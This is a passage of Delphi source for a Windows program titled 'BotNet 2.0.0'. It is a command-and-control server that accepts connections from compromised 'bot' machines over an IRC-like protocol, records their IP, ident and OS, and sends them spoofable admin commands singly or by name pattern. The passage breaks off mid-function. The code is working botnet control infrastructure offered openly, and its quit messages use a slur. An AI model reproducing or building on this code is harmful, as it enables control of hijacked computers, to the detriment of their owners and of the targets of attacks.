   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, Menus, ComCtrls, ScktComp, StdCtrls, ExtCtrls, ShellApi;

   const
     WM_CAllBack = WM_USER;

   type
     TForm1 = class(TForm)
       PopupMenu1: TPopupMenu;
       Ident1: TMenuItem;
       Ip00001: TMenuItem;
       Disconnect1: TMenuItem;
       ServerSocket1: TServerSocket;
       Timer1: TTimer;
       MainMenu1: TMainMenu;
       Server1: TMenuItem;
       Start1: TMenuItem;
       Stop1: TMenuItem;
       Panel1: TPanel;
       Memo1: TMemo;
       ListView1: TListView;
       Splitter1: TSplitter;
       About1: TMenuItem;
       Botnet1: TMenuItem;
       StatusBar1: TStatusBar;
       Timer2: TTimer;
       N1: TMenuItem;
       Exit1: TMenuItem;
       Botpage1: TMenuItem;
       Configure1: TMenuItem;
       N2: TMenuItem;
       Timer3: TTimer;
       Edit1: TEdit;
       Button1: TButton;
       CheckBox2: TCheckBox;
       N3: TMenuItem;
       Sort1: TMenuItem;
       Data1: TMenuItem;
       ext1: TMenuItem;
       Both1: TMenuItem;
       None1: TMenuItem;
       PopupMenu2: TPopupMenu;
       Show1: TMenuItem;
       Exit2: TMenuItem;
       RadioButton1: TRadioButton;
       RadioButton2: TRadioButton;
       ComboBox1: TComboBox;
       Edit2: TEdit;
       BlockUserIPBlock1: TMenuItem;
       JustDisconnect1: TMenuItem;
       Edit3: TEdit;
       Button2: TButton;
       Edit4: TEdit;
       Edit5: TEdit;
       ClientSocket1: TClientSocket;
       procedure ServerSocket1ClientConnect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure Timer1Timer(Sender: TObject);
       procedure Start1Click(Sender: TObject);
       procedure Stop1Click(Sender: TObject);
       procedure ServerSocket1ClientRead(Sender: TObject;
         Socket: TCustomWinSocket);
       Procedure SetInfo(sockid:integer; IP, Nick, Connection, Ident, Os: String);
       procedure ServerSocket1ClientDisconnect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ListView1MouseDown(Sender: TObject; Button: TMouseButton;
         Shift: TShiftState; X, Y: Integer);
       procedure Button1Click(Sender: TObject);
       Function  GetUser(IP: String; ID:Integer):String;
       Function  GetHost(IP: String; ID:Integer):String;
       Function  GetNick(Nick:String):Integer;
       procedure Botnet1Click(Sender: TObject);
       Procedure GetParams(S: String);
       procedure Timer2Timer(Sender: TObject);
       procedure Edit1KeyPress(Sender: TObject; var Key: Char);
       procedure Exit1Click(Sender: TObject);
       procedure ServerSocket1ClientError(Sender: TObject;
         Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
         var ErrorCode: Integer);
       procedure Botpage1Click(Sender: TObject);
       procedure FormResize(Sender: TObject);
       procedure Timer3Timer(Sender: TObject);
       procedure Configure1Click(Sender: TObject);
       Function DoIPCheck(IPS: String): Bool;
       procedure None1Click(Sender: TObject);
       procedure Data1Click(Sender: TObject);
       procedure ext1Click(Sender: TObject);
       procedure Both1Click(Sender: TObject);
       procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
       procedure WM_CALLBACKPRO(var msg : TMessage); message wm_callBack;
       procedure Exit2Click(Sender: TObject);
       procedure Show1Click(Sender: TObject);
       procedure FormCreate(Sender: TObject);
       procedure JustDisconnect1Click(Sender: TObject);
       procedure BlockUserIPBlock1Click(Sender: TObject);
       function NickExists(Nick: String):String;
       procedure Button2Click(Sender: TObject);
       procedure ClientSocket1Connect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure ClientSocket1Error(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
       procedure ClientSocket1Disconnect(Sender: TObject;
         Socket: TCustomWinSocket);
     private
       { Private declarations }
     public
       { Public declarations }
       UserNotified: Bool;
     end;

   var
     Form1: TForm1;
     Params:Array[0..500] Of String;
     blah : HICON;
     TrayIcon : TNotifyIconData;

   implementation

   uses Unit2;

   {$R *.dfm}

   Function TForm1.NickExists(Nick: String):String;
   var
     count :Integer;
     i     :Integer;
     tmp   :String;
     Exist :Bool;
   Begin
     Count := 0;
     I := 0;
     tmp := Nick;
     Exist := False;
     Repeat
       Exist := False;
       I := 0;
       For I := 0 To ListView1.Items.Count -1 Do
       Begin
         If LowerCase(ListView1.Items[i].Caption) = LowerCase(tmp) Then
         Begin
           Inc(Count);
           Tmp := Nick+'['+IntToStr(Count)+']';
           Exist := True;
           Break;
         End;
       End;
     Until Exist = False;
     result := Tmp;
   End;

   Function GetInif(F,Name:String):String;
   Var
     Inif: TextFile;
     Data: String;
     L   : String;
   Begin
     AssignFile(Inif, F);
     Reset(inif);
     Read(inif, L);
     Data := L;
     ReadLn(inif, L);
     While Not Eof(inif) Do
     Begin
       Read(inif, L);
       Data := Data + L;
       ReadLn(inif, L);
     End;
     CloseFile(inif);

     result := copy(data, pos(Name, data)+Length(name), length(data));
     if pos('[', result) >0 Then
       result := copy(result, 1, pos('[', result)-1);
   End;

   Procedure WriteSettings;
   var
     inif          :TextFile;
     cmd           :String;
   begin

     Cmd := ExtractFilePath(ParamStr(0)) + 'config.ini';
     AssignFile(inif, cmd);
     Rewrite(inif);

     Cmd := '[port]'#13#10+Form2.Edit1.text;
     WriteLn(inif, Cmd);

     Cmd := '[chan]'#13#10+Form2.Edit2.text;
     WriteLn(inif, Cmd);

     Cmd := '[spoofed]'#13#10+IntToStr(Integer(Form2.CheckBox3.Checked));
     WriteLn(inif, Cmd);

     Cmd := '[aname]'#13#10+Form2.Edit3.text;
     WriteLn(inif, Cmd);

     Cmd := '[aident]'#13#10+Form2.Edit4.text;
     WriteLn(inif, Cmd);

     Cmd := '[ahost]'#13#10+Form2.Edit5.text;
     WriteLn(inif, Cmd);

     Cmd := '[nicklist]'#13#10+IntToStr(Integer(Form2.CheckBox1.Checked));
     WriteLn(inif, Cmd);

     Cmd := '[privmsg]'#13#10+IntToStr(Integer(Form2.CheckBox2.Checked));
     WriteLn(inif, Cmd);

     Cmd := '[wmsg]'#13#10+Form2.memo1.text;
     WriteLn(inif, Cmd);

     Cmd := '[connection1]'#13#10+
            IntToStr(Integer(Form2.RadioButton1.Checked))+
            IntToStr(Integer(Form2.RadioButton2.Checked))+
            IntToStr(Integer(Form2.RadioButton3.Checked));
     WriteLn(inif, Cmd);

     Cmd := '[connection2]'#13#10+Form2.Memo2.Text;
     WriteLn(inif, Cmd);

     Cmd := '[notified]'#13#10+IntToStr(Integer(Form1.UserNotified));
     WriteLn(inif, Cmd);

     Cmd := '[buddylist]'#13#10+IntToStr(Integer(Form2.CheckBox4.Checked));
     WriteLn(inif, Cmd);

     Cmd := '[blist]'#13#10+Form2.Memo3.Text;
     WriteLn(inif, Cmd);

     Cmd := '[sname]'#13#10+Form2.Edit6.Text;
     WriteLn(inif, Cmd);

     Cmd := '[topic]'#13#10+Form2.Edit7.Text;
     WriteLn(inif, Cmd);

     CloseFile(inif);

   End;

   Procedure SetTip(Text: String);
   Begin
     Shell_NotifyIcon(NIM_DELETE,@TrayIcon);

     Blah := Application.Icon.Handle;

     TrayIcon.cbSize := SizeOf(TNotifyIconData);
     TrayIcon.Wnd := Form1.Handle;
     Move(Text[1], TrayIcon.szTip, Length(Text));
     TrayIcon.uID := 1;
     TrayIcon.hIcon := Blah;
     TrayIcon.uCallbackMessage := WM_CALLBACK;
     TrayIcon.uFlags := NIF_MESSAGE or NIF_ICON or NIF_TIP;

     Shell_NotifyIcon(NIM_ADD, @TrayIcon);
   End;

   procedure TForm1.WM_CALLBACKPRO(var msg : TMessage);
   var
     p : TPoint;
   begin
     case msg.LParam of
       WM_LBUTTONDOWN :
       begin
         If Form1.Visible Then Form1.Visible := False Else Form1.Visible := True;
       end;
       WM_RBUTTONDOWN :
       begin
         GetCursorPos(p);
         PopupMenu2.Popup(p.X,p.Y);
       end;
     end;
   end;

   Function TForm1.GetNick(Nick:String):Integer;
   Var
     I     :Integer;
   Begin
     If ListView1.Items.Count = 0 Then Exit;
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       If (ListView1.Items[i].Caption = Nick) Then
            Result := StrToInt(ListView1.Items[i].SubItems[4]);
     End;
   End;

   Function TForm1.GetHost(IP: String; ID:Integer):String;
   Var
     I     :Integer;
   Begin
     If ListView1.Items.Count = 0 Then Exit;
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       If (ListView1.Items[i].SubItems[0] = IP) and
          (ListView1.Items[i].SubItems[4] = IntToStr(ID)) Then
            Result := ListView1.Items[i].SubItems[2];
     End;
   End;

   Function TForm1.GetUser(IP: String; ID:Integer):String;
   Var
     I     :Integer;
   Begin
     If ListView1.Items.Count = 0 Then Exit;
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       If (ListView1.Items[i].SubItems[0] = IP) and
          (ListView1.Items[i].SubItems[4] = IntToStr(ID)) Then
            Result := ListView1.Items[i].Caption;
     End;
   End;

   Procedure TForm1.SetInfo(sockid:integer; IP, Nick, Connection, Ident, Os: String);
   Var
     I     :Integer;
   Begin
     If ListView1.Items.Count = 0 Then Exit;
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       If ListView1.Items[i].SubItems[0] = IP Then
       Begin
         If ListView1.Items[i].SubItems[4] = IntToStr(SockId) Then
         Begin
           If Nick <> '' Then
             ListView1.Items[i].Caption := Nick;
           If Connection <> '' Then
             ListView1.Items[i].SubItems[1] := Connection;
           If Ident <> '' Then
             ListView1.Items[i].SubItems[2] := Ident;
           If Os <> '' Then
             ListView1.Items[i].SubItems[3] := Os;
         End;
       End;
     End;
   End;

   Function TForm1.DoIPCheck(IPS: String): Bool;
   Var
     m1,m2,m3,m4,
     i1,i2,i3,i4: String;
     I          : Integer;
     Line       : String;
     IP         : String;
   Begin
     If Form2.RadioButton3.Checked Then
     Begin
       Result := True;
       Exit;
     End;

     If Form2.Memo2.Lines.Count > 0 Then
     Begin

       If Form2.RadioButton1.Checked Then
         Result := False
       Else
         Result := True;

       For I := 0 To Form2.Memo2.Lines.Count -1 Do
       Begin

         ip := ips;

         m1 := Copy(ip, 1, pos('.', ip)-1);
         ip := copy(ip, pos('.', ip)+1, length(ip));
         m2 := Copy(ip, 1, pos('.', ip)-1);
         ip := copy(ip, pos('.', ip)+1, length(ip));
         m3 := Copy(ip, 1, pos('.', ip)-1);
         ip := copy(ip, pos('.', ip)+1, length(ip));
         m4 := IP;

         Line := Form2.Memo2.Lines.Strings[i];

         i1 := Copy(Line, 1, pos('.', Line)-1);
         Line := copy(Line, pos('.', Line)+1, length(Line));
         i2 := Copy(Line, 1, pos('.', Line)-1);
         Line := copy(Line, pos('.', Line)+1, length(Line));
         i3 := Copy(Line, 1, pos('.', Line)-1);
         Line := copy(Line, pos('.', Line)+1, length(Line));
         i4 := Line;

         If i1 = '*' Then m1 := '*';
         If i2 = '*' Then m2 := '*';
         If i3 = '*' Then m3 := '*';
         If i4 = '*' Then m4 := '*';

         i1 := i1+'.'+i2+'.'+i3+'.'+i4;
         m1 := m1+'.'+m2+'.'+m3+'.'+m4;

         If Form2.RadioButton1.Checked Then
         Begin
           If i1 = m1 Then
           Begin
             Result := True;
             Break;
           End;
         End;

         If Form2.RadioButton2.Checked Then
         Begin
           If i1 = m1 Then
           Begin
             Result := False;
             Break;
           End;
         End;

       End;

     End;
   End;

   procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
     Socket: TCustomWinSocket);
   var
     item: TListItem;
     i   : Integer;
   begin

     If Not DoIPCheck(Socket.RemoteAddress) Then Begin Socket.Close; Exit; End;

     item := ListView1.Items.Add;
     item.Caption := '';
     item.SubItems.Add(Socket.RemoteAddress);
     item.SubItems.Add('Unknown');
     item.SubItems.Add('*!*@*');
     item.SubItems.Add('Unknown');
     item.SubItems.Add(inttostr(socket.SocketHandle));

     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** Connecting to Botnet'+#10);
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** Login Successfull'+#10);
     {
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** Welcome to a new way of botnets'+#10);
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** --------------------------'+#10);
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** WARNING: The author(s) cannot be'#10);
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** held responsible for any actions'+#10);
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** taken by users of this tool.'+#10);
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** Use this at own risk and responsibility'+#10);
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** '+#13#10);
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** You have been warned (made by p0ke)'+#10);
     Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** --------------------------'+#10);
     }

     If (Form2.Memo1.Lines.Count > 0) Then
       For I := 0 To Form2.Memo1.Lines.Count -1 Do
         Socket.SendText(':'+Form2.Edit6.Text+' NOTICE AUTH :*** '+Form2.Memo1.Lines.Strings[i]+#10);

     If Pos('MOTD', Form2.memo1.text) = 0 Then
       Socket.SendText('MOTD'#10);

     StatusBar1.Panels[0].Text := IntToStr(ListView1.Items.Count)+' Bots';
     StatusBar1.Update;
     StatusBar1.Refresh;

     SetTip('BotNet 2.0.0 ('+IntToStr(ListView1.Items.Count)+' Bots Connected)');
   end;

   procedure TForm1.Timer1Timer(Sender: TObject);
   var
     I:    Integer;
   begin
     If (ServerSocket1.Socket.ActiveConnections = 0) or
        (ServerSocket1.Socket.ActiveConnections = -1) Then
          Exit;
     For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
       ServerSocket1.Socket.Connections[i].SendText('PING :PBNET200'#10);
   end;

   procedure TForm1.Start1Click(Sender: TObject);
   begin
     If ServerSocket1.Active = True Then Exit;

     ServerSocket1.Port := StrToInt(Form2.Edit1.text);

     ServerSocket1.Active := True;
     Memo1.Clear;
     Memo1.Lines.Add('Server Started');
     Caption := 'Botnet - Online';
     StatusBar1.Panels[1].Text := 'Server Active (00:00:00)';
   end;

   procedure TForm1.Stop1Click(Sender: TObject);
   begin
     If ServerSocket1.Active = False Then Exit;
     ServerSocket1.Active := False;
     Memo1.Lines.Add('Server Stopped');
     Caption := 'Botnet - Offline';
     ListView1.Items.Clear;
     StatusBar1.Panels[1].Text := 'Server Disconnected (00:00:00)';
   end;

   procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
     Socket: TCustomWinSocket);
   var
     data          :String;
     data2         :String;
     tmp           :String;
     tmp2          :String;
     tmpIP         :String;
     tmpHost       :String;
     NickName      :String;
     ident         :String;
     xPos          :Integer;
     DoTwice       :Boolean;
     Useless       :String;
     I,J           :Integer;
   begin
     ZeroMemory(@Data, Length(Data));
     data := Socket.ReceiveText;

     Useless := Data;
     While Pos(#13, Useless) > 0 Do
     Begin
       Delete(Useless, Pos(#13, UselesS), 1);
     End;
     Data := Useless;

     tmpIP := Socket.RemoteAddress;
     tmpHost := tmpIP;

     xPos := Pos(#10, Data);
     DoTwice := False;
     If Copy(Data, xPos+2, 1) <> '' Then DoTwice := True;

     Data2 := Data;

     Repeat
       Data := Copy(Data2, 1, Pos(#10, Data2)-1);
       Data2 := Copy(Data2, Pos(#10, Data2)+1, Length(Data2));

       GetParams(Data);

       If (UpperCase(Params[0]) = 'NICK') Then
       Begin
         If Params[1][1] = ':' Then
           Params[1] := Copy(Params[1], 2, Length(Params[1]));
         Params[1] := NickExists(Params[1]);
         If Form2.CheckBox2.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+
            '!'+GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' NICK :'+Params[1]+#13#10;
           For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
   //          If ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle Then
             ServerSocket1.Socket.Connections[i].SendText(Data);
         End;

         If Form2.CheckBox4.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+
            '!'+GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' NICK :'+Params[1]+#13#10;
           For J := 0 To Form2.Memo3.Lines.Count -1 Do
             For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
               If ServerSocket1.Socket.Connections[i].SocketHandle <> GetNick(Form2.Memo3.Lines.Strings[J]) Then
                 ServerSocket1.Socket.Connections[i].SendText(Data);
         End;

         SetInfo(Socket.SocketHandle, tmpIP, Params[1],'','','');
       End;

       If (UpperCase(Params[0]) = 'USER') Then
       Begin
         SetInfo(socket.SocketHandle, tmpIP, '', '', LowerCase(Params[1])+'@'+tmpHost, '');
         Socket.SendText(':'+Form2.Edit6.Text+' 001 '+Params[1]+' :Welcome '+Params[1]+'!'+Params[2]+'@'+tmpHost+'.'#10);
         Socket.SendText(':'+Params[1]+'!'+Params[2]+'@'+tmpHost+' JOIN :'+Form2.Edit2.Text+''#10);

         If Form2.CheckBox4.Checked Then
         Begin
           For J := 0 To Form2.Memo3.Lines.Count -1 Do
           Begin
             If GetNick(Form2.Memo3.Lines.Strings[j]) = Socket.Handle Then
             Begin
               Useless := ':'+Form2.Edit6.Text+' 353 '+Params[1]+' = '+Form2.Edit2.Text+' :'; //@'+Params[1]+' '#10;
               For I := 0 To ListView1.Items.Count -1 Do
               Begin
                 UseLess := UseLess + ListView1.Items[i].Caption+' ';
               End;
               Useless := Useless+#10;
               Socket.SendText(Useless);
             End;
           End;
         End;

         If Form2.CheckBox1.Checked Then
         Begin
           Useless := ':'+Form2.Edit6.Text+' 353 '+Params[1]+' = '+Form2.Edit2.Text+' :'; //@'+Params[1]+' '#10;
           For I := 0 To ListView1.Items.Count -1 Do
           Begin
             UseLess := UseLess + ListView1.Items[i].Caption+' ';
           End;
           Useless := Useless+#10;
           Socket.SendText(Useless);
         End Else
           Socket.SendText(':'+Form2.Edit6.Text+' 353 '+Params[1]+' = '+Form2.Edit2.Text+' :(2.0.0)'+Params[1]+' '#10);
         Socket.SendText(':'+Form2.Edit3.Text+'!is@a.admin TOPIC '+Form2.Edit2.Text+' :'+form2.edit7.text+''#10);
         Socket.SendText(':'+Form2.Edit6.Text+' 366 '+Params[1]+' '+Form2.Edit2.Text+' :End of /NAMES list'#10);
       End;

       If (UpperCase(Params[0]) = 'MODE') Then
       Begin
         If Form2.CheckBox2.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+'!'+
           GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' JOIN '+Form2.Edit2.Text+''#10;
           For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
             If ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle Then
               ServerSocket1.Socket.Connections[i].SendText(Data);
         End;

         If Form2.CheckBox4.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+'!'+
           GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' JOIN '+Form2.Edit2.Text+''#10;
           For J := 0 To Form2.Memo3.Lines.Count -1 Do
             For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
               If (ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle) And
                  (ServerSocket1.Socket.Connections[i].SocketHandle = GetNick(Form2.Memo3.Lines.Strings[J])) Then
                 ServerSocket1.Socket.Connections[i].SendText(Data);
         End;
       End;

       If (UpperCase(Params[0]) = 'PART') Then
       Begin
         If Form2.CheckBox2.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+'!'+
           GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' PART '+Form2.Edit2.Text+''#10;
           For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
             If ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle Then
               ServerSocket1.Socket.Connections[i].SendText(Data);
         End;

         If Form2.CheckBox4.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+'!'+
           GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' PART '+Form2.Edit2.Text+''#10;
           For J := 0 To Form2.Memo3.Lines.Count -1 Do
             For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
               If (ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle) And
                  (ServerSocket1.Socket.Connections[i].SocketHandle = GetNick(Form2.Memo3.Lines.Strings[J])) Then
                 ServerSocket1.Socket.Connections[i].SendText(Data);
         End;
       End;

       If (UpperCase(Params[0]) = 'QUIT') Then
       Begin
         If Form2.CheckBox2.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+'!'+
           GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' QUIT :Gayness'#10;
           For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
             If ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle Then
               ServerSocket1.Socket.Connections[i].SendText(Data);
         End;

         If Form2.CheckBox4.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+'!'+
           GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' QUIT :Gayness'#10;
           For J := 0 To Form2.Memo3.Lines.Count -1 Do
             For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
               If (ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle) And
                  (ServerSocket1.Socket.Connections[i].SocketHandle = GetNick(Form2.Memo3.Lines.Strings[J])) Then
                 ServerSocket1.Socket.Connections[i].SendText(Data);
         End;
       End;

       If (UpperCase(Params[0]) = 'PRIVMSG') Then
       Begin
         Tmp := Copy(Data, Pos(':', Data)+1, Length(Data));
         If Form2.CheckBox2.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+'!'+
           GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' '+ Data + #10;
           For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
             If ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle Then
               ServerSocket1.Socket.Connections[i].SendText(Data);
         End;

         If Form2.CheckBox4.Checked Then
         Begin
           Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle)+'!'+
           GetHost(Socket.RemoteAddress, Socket.SocketHandle) +' '+ Data + #10;
           For J := 0 To Form2.Memo3.Lines.Count -1 Do
             For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
               If (ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle) And
                  (ServerSocket1.Socket.Connections[i].SocketHandle = GetNick(Form2.Memo3.Lines.Strings[J])) Then
                 ServerSocket1.Socket.Connections[i].SendText(Data);
         End;

         If Tmp[Length(Tmp)] = #10 Then Delete(Tmp, Length(Tmp), 1);
         If Tmp[Length(Tmp)] = #13 Then Delete(Tmp, Length(Tmp), 1);

         If Not CheckBox2.Checked Then
           Memo1.Lines.Add('<'+GetUser(Socket.RemoteAddress, Socket.SocketHandle )+'> '+tmp);
       End;
       If (UpperCase(Params[0]) = 'CONNECTION') Then
       Begin
         SetInfo(socket.SocketHandle, tmpIP, '', Params[1], '', '');
       End;
       If (UpperCase(Params[0]) = 'OSTYPE') Then
       Begin
         SetInfo(socket.SocketHandle, tmpIP, '', '', '', Params[1]);
       End;
     Until (Data2 = '') Or (DoTwice = False);
   end;

   procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject;
     Socket: TCustomWinSocket);
   var
     I,J:  Integer;
     data: String;
   begin
     If ListView1.Items.Count <= 0 Then Exit;

     If Form2.CheckBox2.Checked Then
     Begin
       Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle) +' QUIT :Gayness'#10;
       For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
         If ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle Then
           ServerSocket1.Socket.Connections[i].SendText(Data);
     End;

     If Form2.CheckBox4.Checked Then
     Begin
       Data := ':'+GetUser(Socket.RemoteAddress, Socket.SocketHandle) +' QUIT :Gayness'#10;
       For J := 0 To Form2.Memo3.Lines.Count -1 Do
         For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
           If (ServerSocket1.Socket.Connections[i].SocketHandle <> Socket.SocketHandle) And
              (ServerSocket1.Socket.Connections[i].SocketHandle = GetNick(Form2.Memo3.Lines.Strings[J])) Then
                ServerSocket1.Socket.Connections[i].SendText(Data);
     End;

     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       If (ListView1.Items[i].SubItems[0] = Socket.RemoteAddress) And
          (ListView1.Items[i].SubItems[4] = IntToStr(Socket.SocketHandle)) Then
       Begin
         ListView1.Items[i].Delete;
         SetTip('BotNet 2.0.0 ('+IntToStr(ListView1.Items.Count)+' Bots Connected)');
         Break;
       End;
     End;
   end;

   procedure TForm1.ListView1MouseDown(Sender: TObject; Button: TMouseButton;
     Shift: TShiftState; X, Y: Integer);
   var
     cX, cY        :Integer;
     P             :TPoint;
     I,Sel         :Integer;
   begin
     GetCursorPos(P);
     Cx := P.X;
     Cy := P.Y;

     Sel := 0;
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       If ListView1.Items[i].Selected Then Inc(Sel);
     End;

     If Button = mbRight Then
     Begin
       If (ListView1.ItemIndex = -1) Then
       Begin
         PopupMenu1.Items[0].Caption := 'IP (0.0.0.0)';
         PopupMenu1.Items[1].Caption := 'Ident (*!*@*)';
         PopupMenu1.Items[2].Enabled := False;
       End Else
       Begin
         If Sel > 1 Then
         Begin
           PopupMenu1.Items[0].Caption := 'IP (To many selected)';
           PopupMenu1.Items[1].Caption := 'Ident (To many selected)';
         End Else
         Begin
           PopupMenu1.Items[0].Caption := 'IP ('+
           ListView1.ItemFocused.SubItems[0] +')';
           PopupMenu1.Items[1].Caption := 'Ident ('+
           ListView1.ItemFocused.SubItems[2] +')';
         End;
         PopupMenu1.Items[2].Enabled := True;
       End;
       Popupmenu1.Popup(cX, cY);
     End;
   end;

   Procedure TForm1.GetParams(S: String);
   Var
     Tmp         :String;
     I           :Integer;
   Begin
     S := S + ' ';
     I := 0;
     FillChar(Params, 500, #0);

     While Pos(' ', S) > 0 Do
     Begin
       If I = 500 Then Break;
       Tmp := Copy(S, 1, Pos(' ', S)-1);
       S   := Copy(S, Pos(' ', S)+1, Length(S));
       If Tmp <> '' Then
       Begin

         if tmp[1] = '"' Then Delete(tmp, 1, 1);
         if tmp[1] = #10 then delete(tmp, 1, 1);
         if tmp[1] = #13 then delete(tmp, 1, 1);

         if tmp[length(tmp)] = '"' then delete(tmp, length(tmp), 1);
         if tmp[length(tmp)] = #10 then delete(tmp, length(tmp), 1);
         if tmp[length(tmp)] = #13 then delete(tmp, length(tmp), 1);

         Params[i] := Copy(Tmp, 1, 25);
         Inc(I);
       End;
     End;

     I := 2;

   End;

   Procedure TForm1.Button1Click(Sender: TObject);
   Var
     Send_Type: Integer;
     RadioButton: Integer;
     BotName: String;
     I, J: Integer;
     IsServer: Bool;
     Admin: String;
   Begin
   { Selected Bots Only  |  Bots starting with  |  Bots containing  |  Bots ending with}

     If ServerSocket1.Active Then IsServer := True Else IsServer := False;
     Send_Type := ComboBox1.ItemIndex;
     If RadioButton1.Checked Then
       RadioButton := 1
     Else
       RadioButton := 2;
     BotName := Edit2.Text;

     If Form2.CheckBox3.Checked Then
     Begin
       Admin := Form2.Edit3.text+'!'+Form2.Edit4.text+'@'+Form2.Edit5.text;
     End Else
       Admin := 'ADMIN';

     If RadioButton = 2 Then
     Begin
       Case Send_Type Of
         0:Begin
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If ListView1.Items[I].Selected Then
               If Not IsServer Then
                 ClientSocket1.Socket.SendText(ListView1.Items[I].SubItems[4]+' '+Admin+' PRIVMSG '+ListView1.Items[I].Caption+' :'+edit1.text+#10)
               Else
               If IsServer Then
                 For J := 0 To serverSocket1.Socket.ActiveConnections -1 Do
                   If ServerSocket1.Socket.Connections[j].SocketHandle = StrToInt(ListView1.Items[I].SubItems[4]) Then
                     ServerSocket1.Socket.Connections[J].SendText(':'+Admin+' PRIVMSG '+Form2.Edit2.Text+' :'+Edit1.Text+#10);
             End;
           End;
         1:Begin
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If Copy(ListView1.Items[I].Caption,1,Length(BotName)) = BotName Then
               If Not IsServer Then
                 ClientSocket1.Socket.SendText(ListView1.Items[I].SubItems[4]+' '+Admin+' PRIVMSG '+ListView1.Items[I].Caption+' :'+edit1.text+#10)
               Else
               If IsServer Then
                 For J := 0 To serverSocket1.Socket.ActiveConnections -1 Do
                   If ServerSocket1.Socket.Connections[j].SocketHandle = StrToInt(ListView1.Items[I].SubItems[4]) Then
                     ServerSocket1.Socket.Connections[J].SendText(':'+Admin+' PRIVMSG '+Form2.Edit2.Text+' :'+Edit1.Text+#10);
             End;
           End;
         2:Begin
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If Pos(BotName, ListView1.Items[I].Caption)>0 Then
               If Not IsServer Then
                 ClientSocket1.Socket.SendText(ListView1.Items[I].SubItems[4]+' '+Admin+' PRIVMSG '+ListView1.Items[I].Caption+' :'+edit1.text+#10)
               Else
               If IsServer Then
                 For J := 0 To serverSocket1.Socket.ActiveConnections -1 Do
                   If ServerSocket1.Socket.Connections[j].SocketHandle = StrToInt(ListView1.Items[I].SubItems[4]) Then
